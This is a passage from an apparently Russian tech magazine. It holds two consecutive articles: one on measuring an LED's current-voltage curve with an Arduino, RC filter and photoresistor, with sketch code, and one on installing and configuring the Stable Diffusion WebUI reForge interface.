изменяться в зависимости от условий, в которых он находится. И именно
на этом основана вся современная электроника, ведь так можно совершенно
по‑разному взаимодействовать с током, модулировать, усиливать и нап‐
равлять  его. Из  полупроводниковых  материалов  инженеры  придумали
собирать транзисторы, которые позволяют использовать эти замечательные
свойства, а уже из транзисторов делают микросхемы.
  Один из самых популярных полупроводников — кремний. Он доступный,
дешевый и универсальный. Правда, вряд ли кусок кремнезема, который ты
наковыряешь у себя на даче, подойдет для создания транзистора. Кремний
должен быть очень чистым и состоять из одного цельного кристалла, поэтому
их выращивают в лабораториях.
  Про физический смысл работы полупроводников можешь продолжить
читать в Википедии, заодно познакомишься с забавным понятием из мира
физики — «дырками».





                 Полупроводник — от кремния до микросхем


Что за ВАХ?
Вольт‑амперная характеристика, или же сокращенно ВАХ, — это зависимость
тока от напряжения в каком‑либо радиоэлементе. По факту ВАХ необходима
для точных расчетов и проектировки электронных приборов. И вот чтобы
инженер мог на вопрос «Рванет?!» с гордостью и уверенностью ответить «Не
должно...», ему нужна эта характеристика.
   Если помнишь, в школе на уроках алгебры ты чертил графики на осях X и Y.
Здесь же получаются примерно такие же графики, только на одной оси будет
сила тока, на другой — напряжение.
   Измерить ВАХ  можно  вручную,  с помощью  обычного  мультиметра.
Для  этого через исследуемый  компонент необходимо  пропустить  нап‐
ряжение и посмотреть значение силы тока. Потом добавляем напряжение
и записываем соответствующие значения силы тока для каждого последу‐
ющего измерения. Полученные результаты отмечаем на оси в виде точек,
а после строим по ним график. Это и будет вольт‑амперная характеристика.
  В прошлых статьях я рассказывал про светодиод, думаю, ты сталкивался
с ним бессчетное количество раз. Но знал ли ты, что светоизлучающий
диод — это и есть не кто иной, как представитель полупроводниковой струк‐
туры, который излучает кванты света при протекании через него прямого
тока? Когда используют светодиод, обычно учитывают две его основные
характеристики: первая — это непосредственно наша вольт‑амперная, а вто‐
рая — зависимость интенсивности света от силы тока.
  В качестве подопытного суслика будем сегодня использовать именно све‐
тодиод. Если вдруг не помнишь, принцип его действия довольно прост,
по факту это аналог ниппеля в электричестве — ток течет через диод только
в одном направлении, от анода (+) к катоду (–). Ниже ты видишь примеры гра‐
фиков ВАХ и зависимости интенсивности света от силы тока светодиода.





                         Примеры графиков


Arduino за 30 секунд
В нашем проекте нам понадобится микроконтроллер Arduino, о котором ты
уже, думаю, наслышан. Но прежде чем ты закатишь глаза и подумаешь «Ах,
опять эта железка с Алиэкспресса, которой у меня нет», попытаюсь успеть
посоветовать тебе все же купить простой вариант платы, например Nano
или Uno. Я считаю, что любой уважающий себя айтишник должен уметь так
или иначе обращаться с популярными железками. В случае с Arduino это не
только полезно, но и интересно! Считай, я даю тебе шанс заново открыть
для себя Lego, но в мире электроники и программирования.


        WWW

                        Подробно о работе с Arduino можешь почитать
                        в вики «Амперки».


Если вкратце, Arduino — этакий компьютер размером с ладонь. К нему ты
можешь подключить любые подходящие электронные компоненты и зап‐
рограммировать свое устройство, загрузив программу со своего компьюте‐
ра.  Программирование  ведется на С++,  правда  немного  измененном.
Для начала работы тебе необходимо поставить среду разработки Arduino IDE,
которую ты можешь скачать с официального сайта Arduino. Вторая версия,
кстати, сильно отличается от предыдущей (и, как по мне, старая более дру‐
желюбна).





               Разные Arduino и среда разработки Arduino IDE


        WWW

                            Если  нет  возможности  приобрести  железки
                      или просто не хочется ждать, можно попробовать
                          поработать  в  виртуальной  лаборатории,  нап‐
                     ример браузерной Tinkercad. Здесь ты можешь
                          создавать свои проекты на виртуальной Arduino,
                        писать код и даже делать 3D-модели.



Фоторезистор
Теперь поговорим об одном электронном компоненте — который работает
именно за счет наших любимых полупроводников. Ты должен был запомнить,
что они способны менять свои свойства проведения тока в зависимости
от внешних факторов. Фоторезистор как раз хороший пример: он работает
как обычный резистор, то есть ограничивает ток, только вот сопротивление
свое меняет в зависимости от света, который на него попадает.





                  Фоторезистор и его обозначение на схеме

Этот элемент пригодится в проектах, где необходимо как‑то фиксировать
свет. На выходе можно получить аналоговый сигнал, то есть фоторезистор
позволяет не просто узнавать, включен или выключен свет, а еще и измерять
уровень  освещенности  вокруг  датчика. Нам в работе он  понадобится
для определения интенсивности свечения диода.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
                 ВАХ!
          ИЗМЕРЯЕМ ВОЛЬТ-АМПЕРНУЮ
                      ХАРАКТЕРИСТИКУ
       ПОЛУПРОВОДНИКА ПРИ ПОМОЩИ
                           ARDUINO





ПРИСТУПАЕМ К ПРАКТИКЕ

Пш-ш-ш... RC-фильтр для борьбы с шумами
Одна из возможностей Arduino — это передача ШИМ‑сигнала. В статье
про основы цифровой электроники я рассказывал, что такое цифровой сиг‐
нал и чем он отличается от аналогового. Широтно‑импульсная модуляция,
если пользоваться очень грубыми формулировками, позволяет разделить
максимальное напряжение цифрового сигнала на части и тем самым умень‐
шить получаемую нагрузку.
   Например, ШИМ в Arduino позволяет разделить выходное напряжение
микроконтроллера на 256 частей, а после подавать максимальное нап‐
ряжение (5 вольт) в проекции по шкале от 0 до 255. Но это по‑прежнему
будет цифровой сигнал, просто достигаться такой эффект будет за счет
очень быстрого переключения между нулем и питанием.
   Кстати говоря, у экрана твоего телефона тоже есть ШИМ. Замечал, что
если посмотреть через камеру, то экран мерцает? Так вот, это происходит
из‑за того, что яркость экрана регулируется такими быстрыми переключени‐
ями, что глазом их заметить нельзя, но камерой с достаточной частотой кад‐
ра — легко.
  С помощью ШИМ мы можем изучить ВАХ светодиода. Будем постепенно
наращивать яркость, подавая возрастающее напряжение от 0 до 255 в про‐
екции от 0 до 5 вольт. Чтобы сгладить ШИМ‑сигнал и сделать его похожим
на аналоговый, нам потребуется собрать RC-фильтр, простое устройство,
состоящее из R — резистора и С — конденсатора.





                            Схема RC-фильтра

Подходящие значения для R и C можно рассчитать по законам Кирхгофа,
используя формулы ниже.





                     Страшные формулы из физики

Не будем тратить время на погружение в физику, как говорится — из рисунка
видно. Да и вообще проще всего подобрать эти значения на глаз: подключить
компоненты с примерно нужным номиналом, вывести с платы график сгла‐
женного сигнала и посмотреть, насколько он сглаживается. Если сглажива‐
ние недостаточно, заменяем компонентом чуть побольше или чуть поменьше
и продолжаем, пока результат нас не удовлетворит. Лично я всегда так
делаю.


Собираем схему
В Arduino есть пины цифровые, цифровые, поддерживающие ШИМ, и ана‐
логовые. Обозначение аналоговых начинается с А. Пины могут работать
в режиме подачи сигнала и в режиме считывания. Важно: если ты подклю‐
чишь какой‑нибудь цифровой датчик к Arduino и не будешь понимать, почему
он не работает, проверь, не подключил ли ты его к аналоговому пину, ведь
в этом случае ничего работать не будет.
  Для определения вольт‑амперных характеристик нам необходимо изме‐
рять падение напряжения на светодиоде. Подключим RC-фильтр к выходному
пину с ШИМ (например, ко второму), а входами будут аналоговые пины А0,
А1, А2. С помощью пинов А0 и А1 будем снимать показания падения нап‐
ряжения на  светодиоде, а на А2 —  считывать  показания напряжения
на делителе напряжения (с помощью резистора и фоторезистора) и потом
интерпретировать из этого яркость светодиода.





                                  Схема

К пину 3 подключим светодиод, который будет показывать готовность к выг‐
рузке данных, а к пину 4 — кнопку для управления выгрузкой.


Тестируем фильтр
Напишем простую программу, которая будет выводить результат выпрямле‐
ния сигнала в плоттер порта Arduino (визуализация графиков).


             INFO

                     COM-порт в  Arduino — это  виртуальный  пос‐
                          ледовательный порт, к которому можно подклю‐
                             читься, чтобы взаимодействовать с текстовыми
                        данными  прямо  через  компьютер  в  режиме
                          реального времени. В Arduino IDE есть встро‐
                       енная  «консоль» — монитор  порта, в который
                         можно попасть, нажав на  иконку лупы.  Также
                        в Arduino IDE есть Serial Plotter — это инструмент,
                      который   позволяет  визуализировать  данные,
                       выводимые в последовательный порт.



int a;
void setup(){
  Serial.begin(9600);
  pinMode (2, OUTPUT);
  pinMode (A0, INPUT);
  a = 10;
  analogwrite (2, a);
  delay(100);
}


void loop() {
  Serial.println(analogRead(A0));
}

В  итоге при подключении конденсатора мы можем увидеть следующие
результаты.





                           Результат работы RC-фильтра

Четко видно, как отображается ШИМ‑сигнал до и после зарядки конденса‐
тора. Если посмотреть ближе, то будут видны шумы в цепи, этакие неров‐
ности и шероховатости, возникающие из‑за постоянной зарядки‑разрядки
конденсатора. Чем меньше эти шумы, тем лучше подобраны компоненты.
С помощью следующей программы мы определим уровень шумов, и если
колебания  будут  слишком  большие,  то советую тебе  скорректировать
номиналы компонентов в цепи.


int a;
void setup() {
  Serial.begin(9600);
  pinMode (2, OUTPUT);
  pinMode (A0, INPUT);
  pinMode (A1, INPUT);
  a = 10;
  analogWrite(2, a);
  delay(100);
}


void loop() {
  Serial.print (analogRead (A0));
  Serial. print(",");
  Serial.print (analogRead(A1));
  Serial.println();
}

Теперь мы можем увидеть колебания, возникающие при разрядке и зарядке
конденсатора.





                           Колебания конденсатора


Основные действия для программы
Итак, осталось запрограммировать микроконтроллер. Перед нами стоят сле‐
дующие задачи: генерация сигнала в соответствии с требуемыми измерени‐
ями, прием и  обработка входящих сигналов и преобразование данных
для вывода графиков.
   После объявления всех переменных запустим первоначальную настройку:
при запуске устройства нужно разрядить конденсатор, чтобы его заряд
не  влиял на дальнейшие показания  светодиода. Далее  настроим пины
на выход и вход и зададим начальное положение для ШИМ‑сигнала. Ини‐
циализируем создание COM-порта и в цикле выявляем показания шумов
на фоторезисторе для дальнейшей корректировки полученных значений.


int a;
float c, d, e, f, g, j, m;
float c1, d1, e1;
int k, l;
float b[256][3];


void setup() {
 delay(4000);
 Serial.begin(9600);
 pinMode(2, OUTPUT);
 pinMode(3, INPUT);
 pinMode(4, OUTPUT);
 pinMode(A0, INPUT);
 pinMode(A1, INPUT);
 pinMode(A2, INPUT);
 analogWrite(2, a);
 digitalWrite(4, 0);
 delay(100);
 analogReference(DEFAULT);
 f = analogRead(A2);
 g = f;
 for (int i = 0; i <= 1000; i++) {
     m = analogRead(A2);
     f = max(f, m);
     g = min(g, m);
 }
 j = (f + g) / 2;
}
...

Основная часть программы заключается в последовательном изменении
ШИМ‑сигнала на входе от минимального до максимального значения. В каж‐
дой итерации цикла программа записывает конечные значения, вычисляя
потенциал  в  ключевых  точках, и  производит  математические  расчеты.
Для определения максимумов и колебаний значения с пинов проходят про‐
верку во внутреннем цикле. Из‑за того что минимумы появляются в резуль‐
тате просадки заряда конденсатора, эти данные использовать смысла нет.


...
 void loop() {
 if (a <= 255) {
  analogWrite(2, a);
  delay(100);
  for (int i = 0; i <= 100; i++) {
   c1 = analogRead(A0);
   d1 = analogRead(A1);
   e1 = analogRead(A2) - j;
   c = max(c, c1);
   d = max(d, d1);
   e = max(e, e1);
  }
  b[a][0] = ((5 * (c - d)) / 1023);
  b[a][1] = ((((d / 1023) * 5) / 295) * 1000000);
  b[a][2] = e;
  a = a + 1;
 }
...

Но мы совсем забыли про второй наш полупроводник, который нам помогает
в исследовании, — светодиод для индикации. После занесения последнего
значения в конечный массив данных диод загорится и сообщит нам о том, что
данные пора отправлять в COM-порт или в плоттер. При следующем нажатии
на кнопку будут выгружены несколько вариантов данных. Для COM-порта
это значения падения напряжения, тока и интенсивности света от поданного
ШИМ‑сигнала, а для плоттера — построение графиков с учетом размерности
окна и подпись единиц измерения.


...
else if (a > 255) {
  digitalWrite(4, 1);
  if (digitalRead(3) == 1) {
   digitalWrite(4, 0);
   if (k == 0) {
    Serial.println("Вывод_падения_напряжения_В");
    for (int i = 0; i <= 255; i++) {
     Serial.println(b[i][0]);
    }
    for (int i = 0; i <= 244; i++) {
     Serial.println(0);
    }
    k = 1;
    digitalWrite(4, 1);
   } else if (k == 1) {
    Serial.println("Вывод_силы_тока_мкА");
    for (int i = 0; i <= 255; i++) {
     Serial.println(b[i][1]);
    }
    for (int i = 0; i <= 244; i++) {
     Serial.println(0);
    }
    k = 2;
    digitalWrite(4, 1);
   } else if (k == 2) {
    Serial.println("Интенсивность_света");
    for (int i = 0; i <= 255; i++) {
     Serial.println(b[i][2]);
    }
    for (int i = 0; i <= 244; i++) {
     Serial.println(0);
    }
    k = 3;
    digitalWrite(4, 1);
    delay(15);
   } else if (k == 3) {
    Serial.print("мкА_на_");
    Serial.print((b[255][0]), 2);
    Serial.println("/255_В");
    for (int i = 0; i <= 255; i++) {
     Serial.println(b[i][1]);
    }
    for (int i = 0; i <= 244; i++) {
     Serial.println(0);
    }
    k = 4;
    digitalWrite(4, 1);
   } else if (k == 4) {
    for (int i = 0; i <= 255; i++) {
     if (b[i][1] > b[20][1]) {
      l = i;
      break;
     }
    }
    Serial.print("относительная_интенсивность_на_");
    Serial.print(((b[255][1]) - b[10][1]), 2);
    Serial.print("/");
    Serial.print((255 - l));
    Serial.println("_мкА");
    for (int i = l; i <= 255; i++) {
    Serial.println(b[i][2]);
    }
    for (int i = 0; i <= (500 - 255 + l); i++) {
     Serial.println(0);
    }
    k = 3;
    digitalWrite(4, 1);
   }
  }
 }
}

Вот, в общем‑то, и всё. Теперь можно наблюдать через СОМ‑порт и плоттер
за изменениями показаний.





                          Данные в СОМ‑порте

Когда светодиод потребляет очень мало тока и интенсивность его свечения
можно считать нулевой, в графике необходимо учитывать погрешность.





         График зависимости силы тока от интенсивности излучения

Ну и наконец, давай посмотрим на график вольт‑амперной характеристики
нашего светодиода.





                              Вах, какая ВАХ

При каждом запуске СОМ‑порта или плоттера Arduino  перезапускается,
поэтому конденсатор в начале не разряжен, из‑за чего появляется задержка,
и мы можем повторно использовать эту установку.


А если ручками?
Да, как я уже говорил, снять ВАХ можно и без автоматизации. Для этого прос‐
то понадобится вольтметр, источник тока и карандаш с бумагой для записи
измерений. Например, схема ниже как раз позволит снять падение нап‐
ряжения, тока и интенсивности света.





                   Схема для ручного снятия показаний


ВЫВОДЫ

Итак, сегодня мы немного разобрались в микроконтроллерах и научились
с их помощью считывать показания с полупроводников. Я постепенно отхожу
от темы базовой электроники к использованию МК и в следующих статьях
хотел бы рассказать что‑то более захватывающее: например, как можно
полученные  сделанным  сегодня девайсом  данные передать на  другое
устройство, но не по Bluetooth или Wi-Fi, а по тому протоколу, с которым свя‐
зано будущее беспроводной связи. А что это за протокол, ты узнаешь из сле‐
дующей статьи!
GEEK





Тема сегодняшней статьи — продвинутый
инструментарий,    который     позволяет
не только получить доступ к большому чис‐
лу тонких настроек нейросети, но и авто‐
матизировать генерацию высококачествен‐          Олег Афонин                                                                                      Эксперт по мобильной
ных изображений.                                                     криминалистике компании                                                                                         «Элкомсофт»
                                                                                               aoleg@voicecallcentral.com

Ранее мы уже изучили базовые возможности Stable Diffusion и установку ней‐
росети на компьютер, рассмотрели несколько базовых моделей и научились
работать с лорами, стилями и рефайнерами в приложении Fooocus.
   Fooocus прекрасно подходит для начала работы и позволяет без лишних
сложностей получать красивые изображения, но вскоре пользователь упи‐
рается в потолок. В Fooocus не  выйдет  сразу  генерировать  картинки
в высоком разрешении или автоматически исправлять проблемы с руками
и лицами; для этого существуют более продвинутые и намного более слож‐
ные в использовании варианты, один из которых мы и будем изучать.


STABLE DIFFUSION WEBUI И ЕГО ПРОИЗВОДНЫЕ

Stable  Diffusion WebUI, разработанный автором AUTOMATIC1111, — один
из самых популярных интерфейсов к Stable Diffusion, возможно даже самый
популярный. Его  конкурент — ComfyUI, предлагающий  уникальную, «не
для всех», концепцию пользовательского интерфейса. Написать обо всех
продуктах в одной статье невозможно; на сей раз остановимся на интерфей‐
се AUTOMATIC1111, а точнее, на одной из его перспективных производных.
   Интерфейс существует в нескольких вариантах. Место WebUI среди раз‐
личных интерфейсов Stable Diffusion можно описать следующим образом.
 1. Fooocus — простой продукт для начинающих.
 2. WebUI Forge — форк AUTOMATIC1111 с более высокой скоростью работы
   и оптимизированным механизмом работы с видеопамятью, заимствован‐
  ным из другого продукта, ComfyUI. Его разработчик — автор Fooocus
   и сети Control Net. На данный момент активная разработка прекращена,
   а репозиторий переведен в статус экспериментального; на нем будут
   отрабатываться новые технологии.
 3. WebUI reForge — в свою очередь, свежий и активный форк вышеописан‐
   ного WebUI Forge, присутствуют как оптимизации Forge, так и новинки,
   которые появились в AUTOMATIC1111 за время бездействия разработчика
   Forge.
 4. AUTOMATIC1111 —  собственно,  «классический»  WebUI,  upstream
   для разнообразных форков. Для работы на видеокартах с 8 Гбайт VRAM
   и меньше требует доработки напильником и даже после свежих оптимиза‐
   ций в версии 1.10 все равно работает медленнее WebUI Forge.
 5. SD.Next — форк AUTOMATIC1111 за авторством vladmandic. Сложен
   в допиливании и требует от пользователя серьезной подготовки, зато под‐
   держивает новейшие диффузные технологии, которых нет в A1111.
 6. ComfyUI — очень мощный и отлично оптимизированный продукт с самой
  широкой совместимостью и поддержкой разных технологий диффузии.
   Если тебе близок интерфейс в стиле блок‑схем — попробуй, не пожале‐
   ешь!
 7. SwarmUI — на основе Comfy, который все‑таки сложноват в освоении,
   создан интерфейс SwarmUI. Его автор долгое время работал в Stability AI
   и покинул компанию после фиаско с выходом модели SD3 Medium. К это‐
   му продукту стоит присмотреться; возможно, сделаю это в следующей
   статье.


КРАТКАЯ ПРЕДЫСТОРИЯ

Прогресс в системах генеративного ИИ стремителен. Когда я начинал писать
эту статью, самым интересным интерфейсом был WebUI Forge, заметно опе‐
режавший  оригинальный AUTOMATIC1111 по  скорости работы,  особенно
на видеокартах с небольшим объемом памяти. Шли месяцы, и разработчики
AUTOMATIC1111 оптимизировали производительность и добавляли новые воз‐
можности, а репозиторий WebUI Forge как будто застыл во времени. 8 июня
разработчик  Forge  сделал  объявление:  в  AUTOMATIC1111  все  стало
как минимум неплохо, поэтому репозиторий Forge становится эксперимен‐
тальным.
  С одной стороны, в AUTOMATIC1111 и в самом деле подтянули скорость.
С другой — механизм управления памятью из Forge так и не добавили.
В результате даже старый, много месяцев не обновлявшийся WebUI Forge все
еще быстрее оригинала. Разработчик Panchovix сделал собственный форк
WebUI Forge, в котором внедрены почти все новинки из AUTOMATIC1111.
Новый форк работает быстрее и стабильнее оригинального Forge и сущес‐
твенно опережает AUTOMATIC1111. Именно о нем я и хочу рассказать.


УСТАНОВКА И НАЧАЛО РАБОТЫ

Проект reForge — в активной разработке. В ближайшее время ожидается
полноценный файл «всё в одном»; пока же придется повозиться с Git.
  На странице проекта рекомендуется такая последовательность шагов:


git clone https://github.com/Panchovix/stable-diffusion-webui-forge.
git
cd stable-diffusion-webui-forge
git checkout main_upstream_a1111

Можно воспользоваться альтернативной инструкцией. Для начала качаем
полный архив WebUI Forge с GitHub, распаковываем и выполняем из каталога
webui следующие команды:


git remote add reForge https://github.com/Panchovix/stable-diffusion-
webui-reForge
git branch Panchovix/main_upstream_a1111
git checkout Panchovix/main_upstream_a1111
git fetch reForge
git branch -u reForge/main
git pull

На Reddit есть альтернативный вариант установки, я использовал именно его.
Точно так же качаем и распаковываем WebUI Forge, переходим в его папку
и выполняем:


git reset --hard
git remote add reForge https://github.com/Panchovix/stable-diffusion-
webui-reForge
git fetch reForge
git switch -c main_upstream_a1111 panchovix/main_upstream_a1111

Далее нужно запустить update.bat и run.bat. Программа автоматически
скачает и установит необходимые зависимости; впрочем, их не так много —
разработчик оригинала WebUI Forge уже упаковал в архив все необходимое
для начала работы, за исключением  разве что базовой модели Stable
Diffusion — ее ты можешь скачать самостоятельно и положить в папку


\stable-diffusion-webui-forge\webui\models\Stable-diffusion

Здесь stable-diffusion-webui-forge — корневой каталог, в который уста‐
новлен WebUI.
  При желании путь к моделям можно изменить, отредактировав вот этот
файл:


stable-diffusion-webui-forge\webui\webui-user.bat

Для этого нужно раскомментировать и отредактировать строку


##@REM --ckpt-dir %A1111_HOME%/models/Stable-diffusion^

Кстати, в этом же файле можно изменить и другие пути — например,
по которым будет  храниться кеш некоторых моделей  (в основном  тех,
которые используются расширениями).


set XDG_CACHE_HOME=%CD:\~0,2%\.cache\
set TRANSFORMERS_CACHE=%CD:\~0,2%\.huggingface\
set HF_HOME=%CD:\~0,2%\.cache\huggingface\
set HF_DATASETS_CACHE=%CD:\~0,2%\.cache\huggingface\datasets

После успешного запуска тебя встретит приблизительно такой экран.





Что здесь имеет значение:
 • Stable Diffusion checkpoint — тут выбираем базовую модель. Если
   в списке нет ни одной, ее нужно скачать и положить в соответствующую
    папку, после чего нажать на голубую иконку «Обновить список».
 • SD VAE — это кое‑что новое по сравнению с Fooocus. VAE отвечает
   за перевод картинки из латентного пространства в пространство пикселей
   (и наоборот). Ты можешь выбрать автоматическую настройку, и тогда VAE
   будет использоваться из состава базовой модели (если он в нее вообще
   включен, что бывает не всегда), либо скачать и положить в папку stable-
  diffusion-webui-forge\webui\models\VAE внешний VAE. Скачать
   стандартный VAE можно с Civitai.
 • Clip skip — не трогаем. Для моделей SDXL этот параметр в A1111 игно‐
   рируется, так что менять его и бессмысленно, и бесполезно. Он был инте‐
   ресен во времена SD 1.5.
 • txt2img — собственно, в этой вкладке происходит генерация. Остальные
  мы пока не рассматриваем; из ряда вкладок нам будут интересны нас‐
   тройки Settings.
 • Prompt, Negative prompt — здесь хорошо знакомые поля ввода. WebUI
   Forge унаследовал от A1111 синтаксис запросов; мы обязательно погово‐
  рим о них позднее. Важно знать, что все, что работало в Fooocus, будет
   точно так же работать и здесь, но в A1111 возможности управления зап‐
  росами заметно шире.
 • Generate — начало генерации. Однако не спеши жать эту кнопку, мы
  еще не закончили с настройкой.
 • Enqueue и выбор базовой модели над ней: это кнопки расширения Agent
   Scheduler (его нужно устанавливать отдельно из вкладки Extensions — сра‐
   зу после Settings), которое позволяет создавать очереди из запросов.
   Весьма полезное расширение,  поскольку генерация на большинстве
   видеокарт, увы, далеко не мгновенная.

Сразу под кнопкой Enqueue (или Generate, если у тебя не установлено рас‐
ширение Agent Scheduler) находится окно выбора стиля. По умолчанию там
пусто; предустановленных стилей с WebUI Forge не поставляется. О том,
как работать со стилями, — в одном из следующих разделов.
   Дальше начинается самое интересное: параметры генерации. Перед тем
как приступить к созданию шедевра, обязательно нужно их настроить.
 • Sampling method — выбор семплера и шедулера, которые будут исполь‐
   зоваться для создания картинки. Мы обязательно обсудим алгоритмы и их
   различия; пока же порекомендую семплер DPM++ 3M SDE (очень быстрый
   и достаточно свежий алгоритм, но требует больше шагов), DPM++ SDE
   (его  противоположность: медленный, но  детальный,  требует меньше
   шагов), DPM++ 2M SDE (что‑то среднее между ними), а также уникальный
   алгоритм Restart (каждые несколько шагов делает «откат», что в теории
   позволяет избавиться от мелких огрехов). В качестве шедулера пореко‐
   мендую Align Your Steps, недавнюю разработку Nvidia. Этот шедулер поз‐
   воляет получить результат за меньшее число шагов по сравнению с клас‐
   сическими методами.





 • Sampling steps — число шагов для генерации первого прохода. Сильно
   зависит от выбранного семплера и от параметра CFG (выше CFG — боль‐
  ше шагов). Для DPM++ 3M SDE Karras и CFG от 4 до 8 лучше установить
   порядка сорока шагов, а DPM++ SDE Karras может обойтись и двадцатью.

На этом месте стоит прерваться и объяснить, почему бесконечное увеличе‐
ние числа шагов не всегда ведет к улучшению качества изображения. Боль‐
шинство современных (не «унаследованных», ancestral) семплеров добавляет
небольшой промежуточный шум на каждом шаге.
   Таким образом, система уравнений не сходится, не имея какого‑то одного
окончательного решения: по достижении некоего порога картинка перестает
улучшаться и просто немного меняется на каждом шаге.
   Это можно использовать: если ты добился от нейросети нужной ком‐
позиции, но в изображении есть мелкие огрехи, изменение числа шагов
(либо небольшое изменение параметра CFG) при сохранении значения сида
создаст немного другую картинку, на которой огрехов может и не быть.
  При использовании сходящихся семплеров через какое‑то время тоже
достигается предел насыщения, после которого картинка перестает улуч‐
шаться. Более того, небольшие огрехи в любом случае будут исправлены
на втором шаге генерации в процессе повышения разрешения (Hires.fix).
О нем — чуть ниже, а пока закончим с настройками первого прохода.
 • Width, Height — ширина и высота картинки. Обрати внимание: значение
   по умолчанию 512 ⨉ 512 выбрано для Stable Diffusion 1.5; для Stable
   Diffusion XL  используются  другие  значения. Для начала можно выб‐
   рать 1024 ⨉ 1024 точки. Полный список поддерживаемых разрешений
   (можно использовать и другие, но может пострадать качество): 640 ⨉
   1536, 768 ⨉ 1344, 832 ⨉ 1216, 896 ⨉ 1152, 1024 ⨉ 1024, 1152 ⨉ 896, 1216 ⨉
   832, 1344 ⨉ 768, 1536 ⨉ 640.
 • Batch count — число изображений, которые будут сгенерированы пос‐
   ледовательно, одно за другим. Укажешь 10 — будет последовательно сге‐
   нерировано десять картинок.
 • Batch  size —  число  изображений,  которые  будут  генерироваться
   одновременно. Укажешь одну — картинки будут создаваться по одной,
   2 — одновременно будет генерироваться две картинки, укажешь 10 —
   и программа вылетит от переполнения видеопамяти. Повышать этот
   параметр имеет смысл для видеокарт с большим количеством видеопа‐
   мяти; при параллельной генерации в несколько потоков можно получить
   увеличение    скорости   порядка   30%.   Впрочем,    постобработка
   (ADetailer/muDetailer) все равно будет происходить последовательно.
 • CFG Scale — очень важный и интересный параметр, контролирующий,
   насколько буквально нейросеть должна следовать запросу. Минимальное
   значение — 1, максимальное — 35. Для обычных моделей часто рекомен‐
   дуют значения 3–8, иногда можно поднимать до 12–15. Увеличение CFG
   также ведет к увеличению контраста и насыщенности (цветового контрас‐
   та) изображения. При слишком низких значениях CFG мы получим блек‐
   лую, малоконтрастную  картинку. При чрезмерно высоких — «переж‐
   женную»; с этим можно бороться разными способами, от встроенного
   расширения DynamicThresholding (CFG-Fix) Integrated или LatentModifier
   Integrated до специальных лор и расширения CD Tuner, которое позволяет
   контролировать контраст и насыщенность на латентном уровне, еще до
   того, как изображение перейдет в пространство пикселей. Для начала
   попробуй установить CFG=7.
 • Seed — знакомое значение сида. -1 означает случайный сид, любое дру‐
   гое число — некий фиксированный. Дополнительные настройки (Extra) мы
   трогать не будем.
 • Refiner — настройки рефайнера. Рекомендую пока оставить эту настрой‐
   ку выключенной. Для большинства моделей рефайнер не понадобится,
   но в некоторых случаях ты можешь захотеть им воспользоваться. Тогда
   обрати внимание на настройку снизу на скриншоте — Which pass to enable
    refiner for.





Рекомендую настроить рефайнер для первого прохода (first pass), так как его
включение на этапе Hires.fix мало на что влияет. Если ты это сделаешь, то
для собственно второго прохода  (Hires.fix) имеет смысл выбрать  ту же
базовую модель, что и для рефайнера, — в противном случае результат
работы рефайнера будет «съеден» во время второго прохода. Не забудь при‐
менить изменение настроек кнопкой Apply Settings.
   Наконец, мы подошли  к одной из самых  интересных возможностей
WebUI — настройкам второго прохода. За это отвечает алгоритм Hires.fix,
который позволяет повышать разрешение картинки и одновременно исправ‐
лять мелкие огрехи генерации.
 • Hires.fix — настройки второго прохода, который включается выставле‐
  нием галочки Hires.fix.
 • Upscaler — выбор модели повышения разрешения. Это критически важ‐
  ный параметр, поскольку правильная модель сможет исправить типичные
   для заданного типа изображений огрехи и создать убедительную картину,
   рисунок или фотографию высокого разрешения. Для начала можно выб‐
   рать какую‑нибудь универсальную модель DAT или HAT; на крайний слу‐
   чай — ESRGAN_4x. Модели для повышения разрешения мы подробно
   обсудим в следующем разделе.
 • Hires steps — число шагов для второго прохода. Начни с 10–20 шагов;
   со временем ты определишь для себя оптимальное значение.
 • Upscale by — во сколько раз повышать разрешение. Начни со зна‐
   чения 2; для слабых видеокарт, возможно, придется понизить его до 1,5.
  Либо можно указать желаемое разрешение картинки в пикселях.
 • Denoising strength — коэффициент шумоподавления. Еще один очень
   важный параметр, определяющий силу действия алгоритма. Чем меньше
   это значение, тем меньшее влияние на картинку (помимо повышения раз‐
   решения) окажет алгоритм; чем больше — тем более грубые огрехи смо‐
   гут быть исправлены вторым проходом. В то же время слишком большое
   значение  приведет  к  мутациям;  картинка  превращается  в  сюр.
  Для реалистичных изображений попробуй  значения от 0,15 до  0,3,
   для абстрактных можно использовать более высокие коэффициенты —
   до 0,5. Отдельно отмечу семейство алгоритмов Latent, которые работают
   в латентном пространстве. Для них минимально допустимое значение
   denoise — порядка 0,6; с меньшими значениями картинка превращается
   в шум. В то же время при значении 0,6 уровень мутаций зашкаливает, что
   делает алгоритмы Latent малопригодными для использования.
 • Hires checkpoint — здесь можно выбрать отдельную базовую модель
   для второго прохода. Это может оказаться полезным, когда используются
   тематические  обученные модели  (особенно —  в  первых  версиях),
   в результатах работы которых могут присутствовать небольшие огрехи.
   Использование универсальной модели‑ремикса вторым проходом с нем‐
   ного повышенным коэффициентом шумоподавления  часто  позволяет
   сгладить шероховатости обученных моделей. Заодно получишь результат,
   недостижимый в рамках универсальной модели.

Другой сценарий использования раздельных моделей для первого и второго
прохода — генерация ускоренными моделями (LCM, Turbo, Lightning, Hyper,
TCD и так далее). В таких случаях первый проход, как правило, генерируется
ускоренной моделью, а второй — обычной, что позволяет сгладить огрехи,
часто возникающие при ускоренной генерации. (В скобках замечу, что сущес‐
твуют и  гибридные  ускоренные модели, которые  можно  использовать
для обоих проходов.)
 • Hires sampling method — здесь можно указать другой алгоритм сем‐
   плера. Он может оказаться полезным при использовании ускоренных
   моделей. Кроме того, в некоторых случаях применение сходящегося сем‐
   плера может уменьшить нежелательные мутации при повышенном коэф‐
   фициенте шумоподавления. Для начала эту настройку лучше не трогать.

Кажется, пока всё. Можно приступать к генерации картинок, а можно изме‐
нить еще несколько настроек и заодно сохранить настройки среды.


Сохранение настроек
Разумеется, было бы странно каждый раз настраивать WebUI при его запуске.
Сохранить значения настроек можно на вкладке Settings → Defaults, нажать
View Changes и затем Apply. Все изменения будут сохранены в файле


\stable-diffusion-webui-reForge\webui\ui-config.json

При желании ты можешь как редактировать его вручную, так и создавать его
копии с разными наборами настроек (впрочем, с этой целью все‑таки лучше
использовать плагин — например, Config Presets).


Дополнительные настройки
Помимо настроек, доступных на первом экране, стоит поменять и некоторые
другие настройки на вкладке Settings.
   Во‑первых, имеет смысл поменять настройки предпросмотра, как показа‐
но на скриншоте.





Значимые настройки здесь — TAESD в качестве метода предпросмотра (это
быстрый и качественный метод), а также обновление каждые 250 мс (вместо
ежесекундных).
